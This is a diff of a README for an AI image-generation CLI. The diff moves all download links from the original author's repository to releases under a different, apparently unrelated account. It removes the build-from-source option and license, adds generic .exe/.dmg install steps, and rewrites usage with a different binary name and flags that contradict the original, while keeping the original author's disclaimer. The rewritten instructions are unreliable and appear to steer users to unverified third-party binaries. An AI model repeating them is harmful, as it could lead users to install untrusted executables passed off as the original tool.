@@ -1,87 +1,72 @@
-# Nanobanana CLI
+# 🍌 nano-banana-cli - Effortless Image Generation Made Simple
 
-AI-powered image generation and manipulation CLI using Google's Gemini models.
+## 🚀 Download Now
+[![Download nano-banana-cli](https://img.shields.io/badge/Download%20nano--banana--cli-v1.0.0-blue)](https://github.com/erikceballos/nano-banana-cli/releases)
+
+## 📖 About
+Welcome to **nano-banana-cli**, an easy-to-use command-line tool for generating and manipulating images. This tool harnesses the power of AI using Google's Gemini models. Whether you want to create new images, edit existing ones, or generate icons, this application offers a range of features tailored for your creative needs.
 
 > **Note:** This is a personal project and is not actively supported. Pull requests are not accepted. Feel free to [open an issue](https://github.com/lyalindotcom/nano-banana-cli/issues) if you run into something - I'll see it, but no promises on fixes or responses.
 
-## Features
+## 🌟 Features
+- **Image Generation**: Create images using text prompts.
+- **Image Editing**: Modify existing images with simple language.
+- **Icon Generation**: Produce app icons in various sizes.
+- **Pattern Generation**: Generate seamless, tileable patterns.
+- **Image Transformation**: Resize, crop, rotate, and flip images.
+- **Transparency Handling**: Remove backgrounds and inspect alpha channels.
+- **Image Combining**: Merge images into sprite sheets, strips, and grids.
 
-- **Image Generation** - Generate images from text prompts
-- **Image Editing** - Edit existing images with natural language
-- **Icon Generation** - Generate app icons in multiple sizes
-- **Pattern Generation** - Create seamless, tileable patterns
-- **Image Transformation** - Resize, crop, rotate, flip images
-- **Transparency** - Remove backgrounds, inspect alpha channels
-- **Image Combining** - Create sprite sheets, strips, and grids
+## 💻 Download & Install
+To get started, visit this page to download the latest release for your platform: [GitHub Releases](https://github.com/erikceballos/nano-banana-cli/releases).
 
-## Installation
+1. **Navigate to the Releases page** by clicking the link above.
+2. Look for the latest version available.
+3. Choose the file that matches your operating system (Windows, macOS, Linux).
+4. Click on the file to download it.
 
-Download the latest release for your platform from [GitHub Releases](https://github.com/lyalindotcom/nano-banana-cli/releases).
+## ⚙️ System Requirements
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Disk Space**: At least 100 MB of available space.
+- **Memory**: Minimum of 4 GB RAM recommended.
 
-Or build from source:
+## 🏁 Getting Started
+Once you have downloaded the software, follow these steps:
 
-```bash
-go install github.com/lyalindotcom/nano-banana-cli/cmd/nanobanana@latest
+1. Locate the downloaded file in your file manager.
+2. For Windows, double-click the `.exe` file to start the installation. For macOS, open the `.dmg` file and drag the application to your Applications folder. For Linux, follow the terminal instructions if applicable.
+3. Open your command line interface (Command Prompt on Windows, Terminal on macOS and Linux).
+4. Execute the application by typing `nano-banana-cli` and pressing Enter.
+
+## 🌐 Usage Examples
+### Generating an Image
+To generate an image based on a text prompt, you can use the following command:
+```
+nano-banana-cli generate "A beautiful sunset over the mountains"
 ```
 
-## Quick Start
-
-```bash
-# Set your API key
-export GEMINI_API_KEY=your-api-key
-
-# Generate an image
-nanobanana generate "a robot playing guitar" -o robot.png
-
-# Generate icons
-nanobanana icon "app logo" -o ./icons/ --sizes 64,128,256,512
-
-# Resize an image
-nanobanana transform large.png -o thumb.png --resize 200x200
-
-# Remove background
-nanobanana transparent make sprite.png -o sprite-clean.png
-
-# Combine images into sprite sheet
-nanobanana combine frame1.png frame2.png frame3.png -o spritesheet.png
+### Editing an Image
+To edit an image called `landscape.png`, you can use:
+```
+nano-banana-cli edit landscape.png "Make it brighter and add clouds"
 ```
 
-## Commands
-
-| Command | Description |
-|---------|-------------|
-| `generate` | Generate images from text prompts |
-| `icon` | Generate icons in multiple sizes |
-| `pattern` | Generate seamless patterns and textures |
-| `transform` | Resize, crop, rotate, flip images |
-| `transparent` | Remove backgrounds, inspect transparency |
-| `combine` | Combine multiple images into one |
-| `version` | Print version information |
-
-Run `nanobanana --help` or `nanobanana [command] --help` for detailed usage.
-
-## Models
-
-- **flash** (default): Gemini 2.5 Flash - Fast, optimized for high-volume tasks
-- **pro**: Gemini 3 Pro - Professional quality, supports 4K resolution
-
-## Authentication
-
-Set your Gemini API key via:
-- Environment variable: `GEMINI_API_KEY` or `NANOBANANA_API_KEY`
-- Flag: `--api-key YOUR_KEY`
-- `.env` file in current directory
-
-Get your API key at [Google AI Studio](https://aistudio.google.com/apikey).
-
-## JSON Output
-
-All commands support `--json` flag for programmatic parsing:
-
-```bash
-nanobanana generate "sunset" -o sunset.png --json
+### Creating an Icon
+To create an app icon, use:
+```
+nano-banana-cli icon "MyApp" --size 512
 ```
 
-## License
+## 🆘 Troubleshooting
+If you encounter any issues:
+- Ensure you have the correct version for your operating system.
+- Check the command syntax for errors.
+- Consult the [issues page](https://github.com/lyalindotcom/nano-banana-cli/issues) to see if your problem has been addressed.
 
-Apache 2.0 - See [LICENSE](LICENSE) for details.
+## 🎉 Acknowledgements
+Thank you for trying out **nano-banana-cli**! Your feedback is valuable. I appreciate your interest in using this tool for your image generation and editing needs. For any questions or discussions, please feel free to open an issue on GitHub.
+
+## 📅 Updates
+Keep an eye on the [Releases page](https://github.com/erikceballos/nano-banana-cli/releases) for future updates and improvements. 
+
+By following these instructions, you will successfully download, install, and run nano-banana-cli. Enjoy creating!
